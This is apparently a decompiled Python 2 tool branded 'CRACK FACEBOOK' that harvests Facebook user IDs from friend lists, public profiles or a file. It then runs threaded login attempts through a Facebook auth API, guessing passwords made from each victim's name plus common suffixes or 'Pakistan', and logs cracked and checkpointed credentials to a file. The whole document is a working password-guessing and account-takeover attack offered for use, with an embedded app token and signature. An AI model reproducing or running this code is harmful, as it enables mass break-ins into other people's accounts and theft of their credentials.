#Decompyle By HamidMeer'hamii
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: /sdcard/fb.py
# Compiled at: 2020-09-15 17:24:59
import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 fb.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;96m|', '\x1b[1;92m/', '\x1b[1;95m-', '\x1b[1;91m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93mLOADING ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)


t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True

def keluar():
    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Keluar'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0003)


logo = '\n\x1b[1;91m  C R A C K  F A C E B O O K\n\x1b[1;91m  ______   ________  _______  \n\x1b[1;91m /      \\ /        |/       \\ \n\x1b[1;91m/$$$$$$  |$$$$$$$$/ $$$$$$$  |\x1b[1;92mAU : \x1b[1;97mANGGAXD\n\x1b[1;91m$$ |  $$/ $$ |__    $$ |__$$ |\x1b[1;96mFB : \x1b[1;97mUSERVIP.ANGGAXD\n\x1b[1;91m$$ |      $$    |   $$    $$< \n\x1b[1;97m$$ |   __ $$$$$/    $$$$$$$  |\x1b[1;93mGH : \x1b[1;97m/ANGGAXD\n\x1b[1;97m$$ \\__/  |$$ |      $$ |__$$ |\x1b[1;91mYT : \x1b[1;97mANGGA KURNIAWAN\n\x1b[1;97m$$    $$/ $$ |      $$    $$/ \n \x1b[1;97m$$$$$$/  $$/       $$$$$$$/  \n'
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m]\x1b[1;92m Login Token Facebook'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m Exit'
    print '\x1b[1;96m--------------------------------------------------'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;97mChoose Any Option \x1b[91m:\x1b[1;92m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;92m+\x1b[1;97m Paste Your Token : \x1b[1;92m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        menu()
    except KeyError:
        print '\x1b[1;91m[!] Wrong'
        print '\n\x1b[1;97m Account Maybe Checkpoint '


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!] Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '[!] No connection'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;96m\xe2\x80\xa2\x1b[1;97m]\x1b[1;95m Name\x1b[1;90m    :\x1b[1;92m ' + nama
    print '\x1b[1;97m[\x1b[1;96m\xe2\x80\xa2\x1b[1;97m]\x1b[1;95m User ID\x1b[1;90m :\x1b[1;92m ' + id
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[' + warni + '01\x1b[1;97m]' + warna + ' \x1b[1;94mCrack From Friend/Public'
    print '\x1b[1;97m[' + warni + '02\x1b[1;97m]' + warna + ' \x1b[1;94mCrack From Group / Friend Posts'
    print '\x1b[1;97m[' + warni + '03\x1b[1;97m]' + warna + ' \x1b[1;94mUpdate Tools'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]' + warna + '\x1b[1;91m Exit'
    print '\x1b[1;96m--------------------------------------------------'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;92mChoose Any Option \x1b[91m:\x1b[1;92m ')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m  Fill Correctly!'
        pilih()
    elif unikers == '1' or unikers == '01':
        crack_teman()
    elif unikers == '2' or unikers == '02':
        crack_likes()
    elif unikers == '3' or unikers == '03':
        perbarui()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Remove token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
        pilih()


def crack_teman():
    os.system('clear')
    print logo
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[' + warna + '01\x1b[1;97m]' + warni + '\x1b[1;94m Crack Pakistan'
    print '\x1b[1;97m[' + warna + '02\x1b[1;97m]' + warni + '\x1b[1;94m Crack Bangladesh'
    print '\x1b[1;97m[' + warna + '03\x1b[1;97m]' + warni + '\x1b[1;94m Crack USA'
    print '\x1b[1;97m[' + warna + '04\x1b[1;97m]' + warni + '\x1b[1;94m Crack Indonesia'
    print '\x1b[1;97m[' + warna + '05\x1b[1;97m]' + warni + '\x1b[1;94m Crack Malaysia'
    print '\x1b[1;97m[' + warna + '06\x1b[1;97m]' + warni + '\x1b[1;94m Crack India'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]' + warni + ' Back'
    print '\x1b[1;96m--------------------------------------------------'
    pilih_teman()


def pilih_teman():
    univ = raw_input('' + warna + 'Choose Any Option\x1b[91m:\x1b[1;92m ')
    if univ == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
        pilih_teman()
    elif univ == '1' or univ == '01':
        crack_pakis()
    elif univ == '2' or univ == '02':
        crack_bangla()
    elif univ == '3' or univ == '03':
        crack_usa()
    elif univ == '4' or univ == '04':
        crack_indo()
    elif univ == '5' or univ == '04':
        crack_malay()
    elif univ == '6' or univ == '04':
        crack_india()
    elif univ == '7' or univ == '05':
        univ()
    elif univ == '0' or univ == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
        pilih_teman()


def crack_pakis():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m] \x1b[1;92mHack From Friend list'
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m] \x1b[1;92mHack From Public Frendlist'
    print '\x1b[1;97m[\x1b[1;93m03\x1b[1;97m] \x1b[1;92mHack From File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m] Back'
    print '\x1b[1;96m--------------------------------------------------'
    pilih_pakis()


def pilih_pakis():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;93mChoose Any Option \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
        pilih_()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mID Public/friend \x1b[1;91m:\x1b[1;92m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m]\x1b[1;93m Name \x1b[1;91m:\x1b[1;92m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID public / friend does not exist !'
                raw_input('\n\x1b[1;93m[\x1b[1;97m<Back>\x1b[1;93m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No connection!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mName File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File there is no ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File there is no !'
                raw_input('\n\x1b[1;93m[\x1b[1;97m<Back>\x1b[1;93m]')
                crack_indo()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
            pilih_pakis()
        print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mStop then CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mCloning starting ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;96m--------------------------------------------------'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCheckpoint Account Open After 7 days'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95m Crated By : Angga Kurniawan'
    print '\x1b[1;96m--------------------------------------------------'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r[]').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S \x1b[1;97m' + str(len(zowe)))))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Pakistan'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Pakistan123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m--------------------------------------------------'
